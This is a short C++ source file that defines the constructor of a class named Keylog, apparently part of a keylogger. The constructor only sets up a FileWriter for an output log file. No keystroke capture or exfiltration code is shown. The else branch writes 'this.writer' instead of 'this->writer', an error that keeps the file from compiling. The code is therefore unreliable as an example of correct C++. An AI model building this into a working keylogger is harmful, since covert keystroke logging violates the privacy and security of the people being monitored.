#include "keylog.hh"

Keylog::Keylog(const char* file){
	if(file != NULL){
		this->fileOutput = new FileWriter(file);
		this->writer = true;
	}
	else{
		this.writer = false;
	}
}
